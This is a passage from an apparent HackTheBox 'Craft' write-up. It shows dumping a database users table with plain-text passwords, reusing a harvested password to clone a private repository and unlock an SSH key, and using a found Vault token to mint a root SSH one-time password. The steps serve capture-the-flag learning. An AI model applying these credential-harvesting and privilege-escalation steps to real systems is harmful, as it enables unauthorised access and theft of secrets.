/bin/sh: mysql: not found
</code></pre></div><p>Of course, in this jail no <code>mysql</code> available either&hellip; Earlier I noticed a database test script. We will edit and use this python script since nothing else is available.</p>
<p>First, let&rsquo;s list the tables :</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >#!/usr/bin/env python
import pymysql
from craft_api import settings

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = &#34;SELECT table_name FROM information_schema.tables;&#34;
        cursor.execute(sql)
        result = cursor.fetchall()
        for row in result:
            print(row)

finally:
    connection.close()
</code></pre>
  


<p>Running this script will return two tables: <code>brew</code> and <code>users</code>.</p>
<p>Let&rsquo;s list the users by editing the <code>dbtest.py</code> script :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">- sql = &#34;SELECT table_name FROM information_schema.tables;&#34;
</span><span style="color:#f92672"></span><span style="color:#a6e22e">+ sql = &#34;SELECT * FROM user;&#34;
</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app <span style="color:#75715e"># python dbtest.py</span>
<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 1, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span><span style="color:#f92672">}</span>
<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 4, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;ebachman&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;llJ77D8QFkLPQB&#39;</span><span style="color:#f92672">}</span>
<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 5, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;gilfoyle&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;ZEU3N8WNM2rh4T&#39;</span><span style="color:#f92672">}</span>
</code></pre></div><p>Good, a few users with plain-text passwords. Unfortunately none works on SSH&hellip;</p>
<p>So what remains? Let&rsquo;s go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p>
<p>Let&rsquo;s clone it to explore:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git
</code></pre></div><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> .ssh/id_rsa
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh gilfoyle@craft.htb -i id_rsa

  .   *   ..  . *  *
*  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">()</span>  ___
   |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span style="color:#ae81ff">\_</span>| |
   |  |  |  |  |<span style="color:#ae81ff">\_</span>__/
   |<span style="color:#ae81ff">\_</span>|__|__|_/|
    <span style="color:#ae81ff">\_</span>________/

Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
Linux craft.htb 4.9.0-8-amd64 <span style="color:#75715e">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

Last login: Sun Oct <span style="color:#ae81ff">20</span> 06:26:05 <span style="color:#ae81ff">2019</span> from 10.10.15.50
gilfoyle@craft:~$
</code></pre></div><p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat user.txt
bxxxxxxxxxxxxxxxxxxxxxxx4
</code></pre></div><h2 id="root-flag">Root Flag</h2>
<h3 id="recon-1">Recon</h3>
<p>On user <code>gilfoyle</code> nothing particularly catch the eye and the box seems well configured.</p>
<p>Upon more enumeration we still notice an uncommon ssh configuration :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat /etc/ssh/sshd_config
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
PermitRootLogin yes
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>It looks like our entry door for root flag will be through SSH.</p>
<p>Inspecting files in the home directory also shows a token that might be useful:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ ls -a
.  ..  .bashrc    .config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo
gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
</code></pre></div><p>We notice this is about Vault again, we saw it already mentioned in the <code>craft-infra</code> repository. Let&rsquo;s dig that way.</p>
<p>I didn&rsquo;t know anything about Vault at the time so I checked their website :</p>
<blockquote>
<p>Vault is a tool for secrets management, encryption as a service, and privileged access management.<br>
<a href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></p>
</blockquote>
<p>That sounds really interesting for what we need&hellip;</p>
<h3 id="exploiting-vault-for-ssh-root-password">Exploiting Vault for SSH root password</h3>
<p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account SSH password or a way to access the <code>root</code> account.</p>
<p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># set up vault secrets backend</span>

vault secrets enable ssh

vault write ssh/roles/root_otp <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    key_type<span style="color:#f92672">=</span>otp <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    default_user<span style="color:#f92672">=</span>root <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>    cidr_list<span style="color:#f92672">=</span>0.0.0.0/0
</code></pre></div><p>It confirms that Vault is used for ssh access to root. <code>key_type=otp</code> seems to mean that it&rsquo;s working as a one-time password mechanism.</p>
<p>After a bit of Googling we find this documentation on Vault:</p>
<blockquote>
<p>The One-Time SSH Password (OTP) SSH secrets engine type allows a Vault server to issue a One-Time Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification.<br>
<a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
</blockquote>
<p>Alright, we have all the needed information. Let&rsquo;s generate a One-Time Password for the root account!</p>
<p>From here I will follow the documentation linked above. First we need to mount the secrets engine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault secrets enable ssh
Successfully mounted <span style="color:#e6db74">&#39;ssh&#39;</span> at <span style="color:#e6db74">&#39;ssh&#39;</span>!
</code></pre></div><p>Then we create a role with the <code>key_type</code> parameter set to <code>otp</code>. I will use the same command than the one in <code>craft-infra/src/master/vault/secrets.sh</code> to make sure we are not missing anything:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault write ssh/roles/root_otp <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>     key_type<span style="color:#f92672">=</span>otp <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>     default_user<span style="color:#f92672">=</span>root <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>     cidr_list<span style="color:#f92672">=</span>0.0.0.0/0
Success! Data written to: ssh/roles/root_otp
</code></pre></div><p>Last step we create an OTP credential for an IP of the remote host that belongs to <code>otp_key_role</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip<span style="color:#f92672">=</span>10.10.10.110
Key                Value
---                -----
lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d
lease_duration     768h
lease_renewable    false
ip                 10.10.10.110
key                3d32eb8a-61b1-3376-4402-dd15e72206f8
key_type           otp
port               <span style="color:#ae81ff">22</span>
username           root
</code></pre></div><p>Seems like everything went fine. Let&rsquo;s launch a new terminal and try to login as <code>root</code> :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh root@craft.htb

  .   *   ..  . *  *
*  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">()</span>  ___
   |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span style="color:#ae81ff">\_</span>| |
   |  |  |  |  |<span style="color:#ae81ff">\_</span>__/
   |<span style="color:#ae81ff">\_</span>|__|__|_/|
    <span style="color:#ae81ff">\_</span>________/

Password:
Linux craft.htb 4.9.0-8-amd64 <span style="color:#75715e">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

Last login: Sun Oct <span style="color:#ae81ff">20</span> 06:10:03 <span style="color:#ae81ff">2019</span> from 127.0.0.1
root@craft:~# cat root.txt
8xxxxxxxxxxxxxxxxxxx1
</code></pre></div><hr>
<p>This box was really a fun time and my favorite so far. As always do not hesitate to contact me for any questions or feedback.</p>
<p>See you next time !</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/bitlab/">
                  <span class="button__icon">‚Üê</span>
                  <span class="button__text">Bitlab - HackTheBox</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/wall/">
                  <span class="button__text">Wall - HackTheBox</span>
                  <span class="button__icon">‚Üí</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <br><br>
<script src="https://utteranc.es/client.js"
        repo="hg8/hg8.github.io"
        issue-term="pathname"
        label="üí¨ Comment"
        theme="photon-dark"
        crossorigin="anonymous"
        async>
</script>

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>¬© 2020</span>
        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
        <span>
          &nbsp; 
          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
          &nbsp;
          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
        </span>
      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
